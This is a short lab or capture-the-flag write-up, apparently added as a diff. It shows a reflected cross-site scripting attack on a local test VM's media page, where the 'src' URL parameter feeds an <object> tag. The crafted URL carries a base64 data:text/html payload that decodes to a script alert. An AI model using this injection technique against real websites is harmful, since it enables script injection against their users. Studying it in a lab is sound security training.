@@ -1,0 +1,14 @@
+On the home page there is only one image that is a link, the picture of the nsa.
+It leads us to this page :
+http://192.168.56.102/?page=media&src=nsa
+
+Inspecting the page we see that the image is displayed not by a <img> but by a <object> tag :
+<object data="http://192.168.56.102/images/nsa_prism.jpg"></object
+
+we want to change the data displayed by object. the src of the data in chosen by what is put in the src field of the url
+in order to obtain this tag : <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+
+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== -> <script>alert(1)</script>
+
+we craft this url
+http://192.168.56.102/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
